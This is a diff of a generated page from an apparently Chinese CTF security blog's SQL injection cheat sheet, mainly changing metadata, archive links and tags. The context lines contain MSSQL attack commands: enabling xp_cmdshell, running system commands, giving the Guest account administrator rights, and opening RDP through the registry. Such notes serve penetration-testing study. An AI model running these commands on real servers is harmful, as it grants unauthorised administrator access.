@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/13.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/14.png">
 <meta property="article:published_time" content="2021-02-28T05:22:32.000Z">
-<meta property="article:modified_time" content="2021-06-15T03:25:25.967Z">
+<meta property="article:modified_time" content="2021-06-22T07:17:00.113Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="sql">
@@ -647,7 +647,8 @@ height:50vh;
 <ul>
 <li><strong>SA（System Admin）权限</strong>我们可以<strong>直接执行命令</strong>，<strong>DB_OWNER权限</strong>的话，我们可以<strong>找到WEB的路径</strong>，然后用<strong>备份的方式得到webshell</strong>，有时也可以对注册表进行操作。<strong>PUBLIC权限的话</strong>，又要面对<strong>表和列</strong>了，不过MSSQL比ACCESS的“猜”表方便许多，这里是“暴”表，使目标直接暴出来。</li>
 </ul>
-<h2 id="SA权限"><a href="#SA权限" class="headerlink" title="SA权限"></a>SA权限</h2><h3 id="开启xp-cmdshell执行命令"><a href="#开启xp-cmdshell执行命令" class="headerlink" title="开启xp_cmdshell执行命令"></a>开启xp_cmdshell执行命令</h3><p>判断 xp_cmdshell 是否打开，1就是打开了，0就是关闭了<br><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/5.png"><br>如果xp_cmdshell没有开启或者开启了但是执行命令失败可以用下列命令开启</p>
+<h2 id="SA权限"><a href="#SA权限" class="headerlink" title="SA权限"></a>SA权限</h2><h3 id="开启xp-cmdshell执行命令"><a href="#开启xp-cmdshell执行命令" class="headerlink" title="开启xp_cmdshell执行命令"></a>开启xp_cmdshell执行命令</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> master..sysobjects <span class="keyword">Where</span> xtype = <span class="string">&#x27;X&#x27;</span> <span class="keyword">AND</span> <span class="keyword">name</span> = <span class="string">&#x27;xp_cmdshell&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p>判断 xp_cmdshell 是否打开，1就是打开了，0就是关闭了<br><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/5.png"><br>如果xp_cmdshell没有开启或者开启了但是执行命令失败可以用下列命令开启</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;</span>)  <span class="comment">#将该选项的值设置为1</span></span><br><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;reconfigure&#x27;</span>)                             <span class="comment">#保存设置</span></span><br><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;</span>)           <span class="comment">#将xp_cmdshell的值设置为1</span></span><br><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;reconfigure&#x27;</span>)                             <span class="comment">#保存设置</span></span><br><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;sp_configure&#x27;</span>)                            <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;xp_cmdshell &quot;whoami&quot;&#x27;</span>)                    <span class="comment">#执行系统命令</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">exec sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;       <span class="comment">#将该选项的值设置为1</span></span><br><span class="line">reconfigure;                                       <span class="comment">#保存设置</span></span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;                 <span class="comment">#将xp_cmdshell的值设置为1</span></span><br><span class="line">reconfigure;                                       <span class="comment">#保存设置</span></span><br><span class="line">exec sp_configure;                                  <span class="comment">#查看配置</span></span><br><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;                          <span class="comment">#执行系统命令</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/6.png" alt="开始xp_cmdshell后执行whoami的结果"><br>尝试添加Guest激活后加入administrators组</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user Guest 123456&#x27;              <span class="comment">#给guest用户设置密码</span></span><br><span class="line">exec xp_cmdshell &#x27;net user Guest /active:yes&#x27;         <span class="comment">#激活guest用户</span></span><br><span class="line">exec xp_cmdshell &#x27;net localgroup administrators Guest /add&#x27;  <span class="comment">#将guest用户添加到administrators用户组</span></span><br><span class="line">exec xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;        <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
@@ -2304,9 +2305,43 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 90
+        Total : 92
         </div>
         <!-- search  -->
         
@@ -2323,6 +2358,16 @@ top:50vh;
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2021/06/25/TP5SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5-1-6-5-1-7/" >TP5SQL注入漏洞分析(5.1.6-5.1.7)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2021/06/25/TP5SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5-0-13-5-0-15-5-1-0-5-1-5/" >TP5SQL注入漏洞分析(5.0.13-5.0.15,5.1.0-5.1.5)</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2790,13 +2835,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
@@ -2830,13 +2875,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
-        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
-    
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
@@ -2846,11 +2891,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
         <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
@@ -2916,9 +2967,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
     
-        <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
-    
         <span class="sidebar-tag-name" data-tags="零宽度字符"><span class="iconfont-archer">&#xe606;</span>零宽度字符</span>
+    
+        <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
     
@@ -2927,8 +2978,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="云函数"><span class="iconfont-archer">&#xe606;</span>云函数</span>
     
         <span class="sidebar-tag-name" data-tags="JAVA_WEB"><span class="iconfont-archer">&#xe606;</span>JAVA_WEB</span>
-    
-        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
     
         <span class="sidebar-tag-name" data-tags="原型链污染"><span class="iconfont-archer">&#xe606;</span>原型链污染</span>
     
